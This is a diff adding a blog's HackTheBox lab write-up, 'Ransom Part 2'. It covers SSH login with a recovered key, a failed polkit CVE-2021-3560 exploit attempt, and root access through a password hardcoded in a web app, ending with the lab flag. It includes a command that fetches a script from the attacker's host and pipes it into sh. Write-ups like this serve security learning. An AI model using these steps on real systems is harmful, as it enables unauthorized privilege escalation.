@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Ransom Part 2 - HackTheBox :: dwo.sh</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/ransom-part-2---hackthebox/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/extended.min.9f2900d1abbf8230ea58db511e896e7c56cfd8580ba8ced694f185c3c7b61843.css">
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Ransom Part 2 - HackTheBox">
+<meta property="og:description" content="
+" />
+<meta property="og:url" content="/posts/ransom-part-2---hackthebox/" />
+<meta property="og:site_name" content="dwo.sh" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-01-16 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    dwo.sh
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/">home</a></li>
+        
+      
+        
+          <li><a href="/about">about</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/" >home</a></li>
+        
+      
+        
+          <li><a href="/about" >about</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/ransom-part-2---hackthebox/">Ransom Part 2 - HackTheBox</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-01-16</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><img alt="Image Description" src="/images/Pasted%20image%2020260116094520.png"></p>
+<h2 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p><a href="/posts/ransom-part-1---hackthebox/">Part 1</a> of ransom was HARD. With that being said, the only stage I had severe difficulty with was the poorly documented bkcrack tool. Hopefully, I can escalate privileges without peeking at the solutions&hellip; let&rsquo;s do this!</p>
+<h2 id="logging-in">Logging in<a href="#logging-in" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>We are currently at the stage where we have an unzipped copy of a home directory, containing an ssh key.</p>
+<p>Inspecting the id_rsa.pub file, we find a username at the end of it:</p>
+<pre tabindex="0"><code>david@red:~/Downloads/bkcrack-1.8.1-Linux-x86_64/uploaded/.ssh$ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrDTHWkTw0RUfAyzj9U3Dh+ZwhOUvB4EewA+z6uSunsTo3YA0GV/j6EaOwNq6jdpNrb9T6tI+RpcNfA+icFj+6oRj8hOa2q1QPfbaej2uY4MvkVC+vGac1BQFs6gt0BkWM9JY7nYJ2y0SIibiLDDB7TwOx6gem4Br/35PW2sel8cESyR7JfGjuauZM/DehjJJGfqmeuZ2Yd2Umr4rAt0R4OEAcWpOX94Tp+JByPAT5m0CU557KyarNlW60vy79njr8DR8BljDtJ4n9BcOPtEn+7oYvcLVksgM4LB9XzdDiXzdpBcyi3+xhFznFKDYUf6NfAud2sEWae7iIsCYtmjx6Jr9Zi2MoUYqWXSal8o6bQDIDbyD8hApY5apdqLtaYMXpv+rMGQP5ZqoGd3izBM9yZEH8d9UQSSyym/te07GrCax63tb6lYgUoUPxVFCEN4RmzW1VuQGvxtfhu/rK5ofQPac8uaZskY3NWLoSF56BQqEG9waI4pCF5/Cq413N6/M= htb@ransom
+</code></pre><p>We then use this with the private key to log into the host via ssh, using <code>ssh htb@$IP -i id_rsa</code></p>
+<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Immediately, we see we are a sudoer. Nice.</p>
+<pre tabindex="0"><code>htb@ransom:~$ id;whoami
+uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+htb
+</code></pre><p>Based on that, we just need root&rsquo;s password and we are good to go.</p>
+<p>After running Linpeas with <code>curl -L http://10.10.17.8:5555/linpeas.sh | sh</code>, I found the following:</p>
+<p>!<img alt="Image Description" src="/images/Pasted%20image%2020260116155512.png"></p>
+<p>Looking up the CVE, I&rsquo;m now reading <a href="https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/">this article</a> which details how to exploit it. We&rsquo;ll give this a quick go, then look at all the password files after.</p>
+<p>Testing the repo at <a href="https://github.com/tufanturhan/Polkit-Linux-Priv">https://github.com/tufanturhan/Polkit-Linux-Priv</a>:</p>
+<pre tabindex="0"><code>htb@ransom:~$ python3 cve.py
+**************
+Exploit: Privilege escalation with polkit - CVE-2021-3560
+Exploit code written by Ahmad Almorabea @almorabea
+Original exploit author: Kevin Backhouse 
+For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
+**************
+[+] Starting the Exploit 
+^[[D^[[D^[[D
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+id: ‘ahmed’: no such user
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+id: ‘ahmed’: no such user
+</code></pre><p>No good! I&rsquo;ll take another look for password files.</p>
+<p>Darn&hellip; this lab defeated me a second time. I had to look at the solutions once again, which is disappointing but necessary. I think Medium difficulty is still a little too hard.</p>
+<p>First, check where the root web directory is:</p>
+<pre tabindex="0"><code>htb@ransom:/srv/prod$ cat /etc/apache2/sites-enabled/000-default.conf 
+&lt;VirtualHost *:80&gt;
+	ServerAdmin webmaster@localhost
+	DocumentRoot /srv/prod/public
+
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+	    &lt;Directory /srv/prod/public&gt;
+	       Options +FollowSymlinks
+	       AllowOverride All
+	       Require all granted
+	    &lt;/Directory&gt;
+
+&lt;/VirtualHost&gt;
+</code></pre><p>We will cd to <code>/srv/prod</code> and look for a password which may have been hardcoded on the site setup. (It looks easy, but how was I meant to know that&rsquo;s where the password was?):</p>
+<pre tabindex="0"><code>htb@ransom:/srv/prod$ grep -r &#34;Invalid Password&#34;
+app/Http/Controllers/AuthController.php:        return &#34;Invalid Password&#34;;
+</code></pre><p>Catting the file:</p>
+<pre tabindex="0"><code>        if ($request-&gt;get(&#39;password&#39;) == &#34;UHC-March-Global-PW!&#34;) {
+            session([&#39;loggedin&#39; =&gt; True]);
+            return &#34;Login Successful&#34;;
+        }
+  
+        return &#34;Invalid Password&#34;;
+    }
+
+}
+</code></pre><p>And logging in with the password:</p>
+<pre tabindex="0"><code>htb@ransom:/srv/prod$ su
+Password: 
+root@ransom:/srv/prod# cd root
+bash: cd: root: No such file or directory
+root@ransom:/srv/prod# ls
+README.md  artisan    composer.json  config    package.json  public     routes      storage  vendor
+app        bootstrap  composer.lock  database  phpunit.xml   resources  server.php  tests    webpack.mix.js
+root@ransom:/srv/prod# cd /root
+root@ransom:~# ls
+root.txt
+root@ransom:~# cat root.txt
+a58231cc724ceecd5b639e94ad391895
+</code></pre><p>DONE!</p>
+<h2 id="reflection">Reflection<a href="#reflection" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>That was BRUTAL. Knowing HackTheBox, I should have seen my sudo group and immediately followed a manual password hunting guide like <a href="https://juggernaut-sec.com/password-hunting-lpe/">this</a>.</li>
+<li>Everything takes longer for Medium difficulty labs.</li>
+<li>I need more experience&hellip; but I still did ok, considering how difficult it was!</li>
+</ul>
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/shocker---hackthebox/" class="button inline prev">
+        &lt; [<span class="button__text">Shocker - HackTheBox</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/ransom-part-1---hackthebox/" class="button inline next">
+         [<span class="button__text">Ransom Part 1 - HackTheBox</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© David Willis-Owen</span>
+    
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
